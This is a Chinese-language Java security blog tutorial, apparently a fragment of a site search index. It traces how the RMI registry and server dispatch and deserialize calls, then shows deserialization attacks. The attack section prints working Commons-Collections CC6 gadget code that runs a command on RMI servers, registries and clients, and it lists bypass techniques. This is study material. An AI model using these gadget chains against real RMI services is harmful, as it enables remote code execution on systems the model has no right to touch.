+                ></p>
+<p>这里从 ObjectTable 中获取封装的 Target 对象，并获取其中的封装的 UnicastServerRef 以及 RegistryImpl 对象。然后调用 UnicastServerRef 的 <code>dispatch</code> 方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121134021804.png"
+                      alt="image-20240121134021804"
+                ></p>
+<p>然后继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121134149828.png"
+                      alt="image-20240121134149828"
+                ></p>
+<p>然后会判断skel师是否为空我们这里根据变量调试信息可以看到这里的skel并不为空，用来区分注册中心和服务端</p>
+<p>然后我们这里是不为空的就会调用这个oldDispatch方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121134934298.png"
+                      alt="image-20240121134934298"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20240121135155865.png"
+                      alt="image-20240121135155865"
+                ></p>
+<p>在oldDispatch方法中首先是通过 <code>skel</code> 对象的 <code>getOperations</code> 方法获取与该骨架对象关联的操作数组。然后可以看的调用<code>unmarshalCustomCallData</code>方法对从输入流获取的数据进行反序列化，然后调用skel的dispatch方法，那么这里也就是<code>RegistryImpl_Skel</code>的dispatch方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121142149000.png"
+                      alt="image-20240121142149000"
+                ></p>
+<p>RegistryImpl_Skel 的 <code>dispatch</code> 方法根据流中写入的不同的操作类型分发给不同的方法处理，例如 0 代表着 bind 方法，则从流中读取对应的内容，反序列化，然后调用 RegistryImpl 的 bind 方法进行绑定。</p>
+<p>客户端请求注册中心调用的是lookup这里也就是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case 2: // lookup(String)</span><br><span class="line">&#123;</span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    try &#123;</span><br><span class="line">        ObjectInputStream in = (ObjectInputStream)call.getInputStream();</span><br><span class="line">        $param_String_1 =</span><br><span class="line">                SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br><span class="line">    &#125; catch (ClassCastException | IOException e) &#123;</span><br><span class="line">        call.discardPendingRefs();</span><br><span class="line">        throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line">    java.rmi.Remote $result = server.lookup($param_String_1);</span><br><span class="line">    try &#123;</span><br><span class="line">        java.io.ObjectOutput out = call.getResultStream(true);</span><br><span class="line">        out.writeObject($result);</span><br><span class="line">    &#125; catch (java.io.IOException e) &#123;</span><br><span class="line">        throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>$param_String_1 =SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</code>这里就是对获取到的方法名序列化后的值进行反序列化，然后再调用lookup方法进行查询，然后将查询的结果进行序列化。这也就是说为什么客户端要对响应结果进行反序列化。</p>
+<h3 id="6、客户端请求服务端-服务端"><a href="#6、客户端请求服务端-服务端" class="headerlink" title="6、客户端请求服务端-服务端"></a>6、客户端请求服务端-服务端</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121150510136.png"
+                      alt="image-20240121150510136"
+                ></p>
+<p>客户端请求服务端服务端的工作流程的和注册中心的前半部分是一样的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121150707557.png"
+                      alt="image-20240121150707557"
+                ></p>
+<p>不同的是在调用unicastServerRef的dispatch方法处，再dispatch方法中会进行一个判断判断skel是否为空，也就是判断当前是注册端还是服务端调用，上面我们再分析注册端地调用流程的时候，这里的skel是存在的所有调用了olddispatch方法，但是当服务端调用的时候这里的skel是为空的，所以这里并不会调用oldDispatch方法，而是继续向下调用，这就是在调用注册端和服务端流程不同的地方：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121151758603.png"
+                      alt="image-20240121151758603"
+                ></p>
+<p>这里首先就是获取到我们传入的参数也就是我们要调用的方法名</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152200407.png"
+                      alt="image-20240121152200407"
+                ></p>
+<p>我们在客户端传入的数据是进行了序列化的，所以在服务端在处理的时候要进行反序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152307670.png"
+                      alt="image-20240121152307670"
+                ></p>
+<p>然后根据传入的类型调用不同的反序列逻辑</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152422950.png"
+                      alt="image-20240121152422950"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152600743.png"
+                      alt="image-20240121152600743"
+                ></p>
+<p>然后在这里调用invoke方法进行远程调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152647454.png"
+                      alt="image-20240121152647454"
+                ></p>
+<p>根据参数调试信息我们可以看到调用结果就是hellorun…</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152736760.png"
+                      alt="image-20240121152736760"
+                ></p>
+<p>然后后面就是对调用结果进行序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121152801957.png"
+                      alt="image-20240121152801957"
+                ></p>
+<p>同样是根据类型调用不同的序列化策略，服务将远程调用结果通过序列化传给客户端，客户端收到后在进行反序列化就可以获取到远程调用的值，然后在进行后续处理。</p>
+<h2 id="五、RMI攻击"><a href="#五、RMI攻击" class="headerlink" title="五、RMI攻击"></a>五、RMI攻击</h2><p>通过前面分析RMI注册端，客户端和服务端的调用流程，可以发现客户端在进行调用注册中心或者服务端的时候是通过序列化和反序列化进行数据传输的，那么我们这里可以对序列化或者反序列化的数据进行控制或者修改就能对相应的服务进行攻击。</p>
+<h3 id="1、攻击server端"><a href="#1、攻击server端" class="headerlink" title="1、攻击server端"></a>1、攻击server端</h3><p><strong>（1）恶意服务参数</strong></p>
+<p>我们前面分析到当客户端请求注册中心获取到stub后，会调用这个stub与服务端进行请求，stub会将客户端传递的参数进行序列化然后传给服务端，服务端会对收到的客户端参数进行反序列化，然后进行调用，如果这个参数是 Object 类型的情况下，Client 端可以传给 Server 端任意的类，这个时候就会造成一个反序列化漏洞，攻击者可以构造恶意的攻击类传递过去，对服务端进行攻击和利用。</p>
+<p>客户端对传递的参数进行序列化：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121163016162.png"
+                      alt="image-20240121163016162"
+                ></p>
+<p>服务端对获取到的参数进行反序列化：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121163052185.png"
+                      alt="image-20240121163052185"
+                ></p>
+<p>新建一个传递object类型的方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121163218341.png"
+                      alt="image-20240121163218341"
+                ></p>
+<p>然后修改客户端代码，调用saygoodbye，传递构造的恶意代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package RMIfenxi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        HashSet hashSet=new HashSet();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(&quot;test1&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;192.168.1.15&quot;, 1099);//获取远程主机对象</span><br><span class="line">        rmi hello = (RMIfenxi.rmi) registry.lookup(&quot;saygoodbye&quot;);</span><br><span class="line"></span><br><span class="line">        hello.saygoodbye(hashSet);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里构造的恶意代码为CC6的利用代码</p>
+<p>然后正常启动服务端</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121163526074.png"
+                      alt="image-20240121163526074"
+                ></p>
+<p>服务端启动后，启动客户端进行远程方法的调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240121163604935.png"
+                      alt="image-20240121163604935"
+                ></p>
+<p>可以看到，当客户端进行远程调用后就会执行我们的命令，调用计算器程序，当服务端收到我们传递的恶意代码参数，就会对其进行反序列化，然后就会触发CC6利用链，然后执行弹出计算器的命令。</p>
+<p>但是有一点要注意的是传入的参数不能是基本类型，<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240123155452630.png"
+                      alt="image-20240123155452630"
+                ></p>
+<p>我们可以看到在其反序列化的逻辑中如果是string，int等基础类型就会进入其相应的处理逻辑中，那么我们就不能够反序列化利用成功了，当传入参数的类型不是基础类型的时候才会进入else子句中调用readObject中进行反序列化处理。</p>
+<p>那这里如果我们传入的不是基础类型外的非Object类型，是否能够反序列化成功。</p>
+<p>一般情况下通常客户端和服务端的调用的服务接口是一样的，那么如果我们修改服务端的接口类型为为其他类型，但是客户端仍然定义接受Object类型，是否还能触发反序列化漏洞呢？</p>
+<p> 答案是不能的，在调用的过程中会抛出异常</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240123191055104.png"
+                      alt="image-20240123191055104"
+                ></p>
+<p>这是因为在服务端没有找到相应的调用方法，是在 UnicastServerRef 的 <code>dispatch</code> 方法中在 <code>this.hashToMethod_Map</code> 中通过 Method 的 hash 来查找的。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。这里找到的是服务端我们设置的类型的hash值，但是我们传递的是object类的数据，所以导致抛出异常，这里有几种解决方法，也就是绕过手法：</p>
+<ul>
+<li>通过网络代理，在流量层修改数据</li>
+<li>自定义 “java.rmi” 包的代码，自行实现</li>
+<li>字节码修改</li>
+<li>使用 debugger</li>
+</ul>
+<p>详情可以参考下面几篇文章：</p>
+<p><a class="link"   href="https://su18.org/post/rmi-attack/#1-%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0" >https://su18.org/post/rmi-attack/#1-%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/7930?time__1311=n4+xnD0G0=eQqiIPAKDsA3OhIDCSDgnrQrnhYD&alichlgref=https://xz.aliyun.com/t/7930#toc-6" >https://xz.aliyun.com/t/7930?time__1311=n4%2BxnD0G0%3DeQqiIPAKDsA3OhIDCSDgnrQrnhYD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7930#toc-6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>（2）远程加载对象</strong></p>
+<p>利用条件毕竟苛刻</p>
+<p>可以参考下面文章：</p>
+<p><a class="link"   href="https://paper.seebug.org/1091/#serverrmi-server" >https://paper.seebug.org/1091/#serverrmi-server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://su18.org/post/rmi-attack/#2-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD" >https://su18.org/post/rmi-attack/#2-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="2-攻击-Registry-端"><a href="#2-攻击-Registry-端" class="headerlink" title="2. 攻击 Registry 端"></a>2. 攻击 Registry 端</h3><p>客户端请求注册中心客户端序列化：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240123192950465.png"
+                      alt="image-20240123192950465"
+                ></p>
+<p>客户端请求注册中心注册中心反序列化：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240123193046171.png"
+                      alt="image-20240123193046171"
+                ></p>
+<p>客户端向注册中心发起请求的时候是通过序列化进行数据传输的，我们可以看到客户端将传入的参数进行序列化，然后调用invoke方法传递给注册中心，所以后面的代码对攻击没有什么影响，但是，这里这个功能只接受一个字符串作为参数，那么skel在进行反序列化的时候也只会对字符串进行反序列化，这样的话我们的恶意类是不是就无法利用的。但是这里实际上客户端已经获取到了RegistryImpl_Stub了，也就是获取到了里面的ref，我们这里可以自己定义通信的对象，我们可以直接在本地写一个lookeup方法然后把恶意对象发给注册中心就能够实现反序列化利用了。</p>
+<p>同样的这里服务端和客户端也是一样的道理，只不过服务端使用的是bind方法，那我们直接重写一个bind的方法，然后将恶意对象发给注册中心就能够实现利用：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class RegistryExploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line"></span><br><span class="line">        lookup(registry);</span><br><span class="line">//        bind(registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void lookup(RegistryImpl_Stub registry) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">            Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">            Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">            refField.setAccessible(true);</span><br><span class="line">            UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">            Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">            RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">            ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">            var3.writeObject(genEvilMap());</span><br><span class="line">            ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void bind(RegistryImpl_Stub registry) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">        RemoteCall var3 = ref.newCall(registry, operations, 0, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var4 = var3.getOutputStream();</span><br><span class="line">        var4.writeObject(&quot;test&quot;);</span><br><span class="line">        var4.writeObject(genEvilMap());</span><br><span class="line"></span><br><span class="line">        ref.invoke(var3);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static HashMap genEvilMap() throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, &quot;bbb&quot;);</span><br><span class="line">        lazyMap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3、注册中心攻击客户端"><a href="#3、注册中心攻击客户端" class="headerlink" title="3、注册中心攻击客户端"></a>3、注册中心攻击客户端</h3><p>通过前面的分析我们可以知道，注册中心也可以攻击客户端，客户端向注册发起请求后，注册中心同样是进行序列化然后传输给客户端，客户端会对相应的结果进行反序列化，也就是反序列化查询到的Stub对象,那么在注册中心绑定恶意对象。客户端在调用lookup方法进行反序列化的时候就会被攻击：</p>
+<p>攻击代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class EvilRegistry &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RemoteObjImpl();</span><br><span class="line">        Remote remoteObj = new RemoteWrapper();</span><br><span class="line">        Registry r = LocateRegistry.createRegistry(1099);</span><br><span class="line">        r.bind(&quot;remoteObj&quot;,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RemoteWrapper implements Remote, Serializable &#123;</span><br><span class="line">    private Map map;</span><br><span class="line"></span><br><span class="line">    RemoteWrapper() throws Exception &#123;</span><br><span class="line">        this.map = genEvilMap();//恶意代码类</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4、服务端攻击客户端"><a href="#4、服务端攻击客户端" class="headerlink" title="4、服务端攻击客户端"></a>4、服务端攻击客户端</h3><p>其实根据前面的分析我们就可以知道这个攻击都是相互的，客户端可以攻击服务端，服务端那么也可以反过来攻击客户端，因为客户端和服务端的传输是通过序列化和反序列化来实现，，当服务端处理客户端发过来的请求后，会通过序列化将处理的结果返回给客户端，客户端收到响应后会对其进行反序列化，那么这里服务端伪造一个恶意对象给客户端，客户端对其进行反序列化的时候就会受到攻击。</p>
+<p>但是这里和客户端一样，这里如果返回值时Object就可以直接打，但是如果是其他类型就需要重新实现一个服务端。</p>
+<p>这里不在详细分析了。</p>
+<h3 id="5、攻击DGC"><a href="#5、攻击DGC" class="headerlink" title="5、攻击DGC"></a>5、攻击DGC</h3><h3 id="6、JEP290"><a href="#6、JEP290" class="headerlink" title="6、JEP290"></a>6、JEP290</h3><h3 id="7、JEP290的绕过"><a href="#7、JEP290的绕过" class="headerlink" title="7、JEP290的绕过"></a>7、JEP290的绕过</h3>]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
 </search>
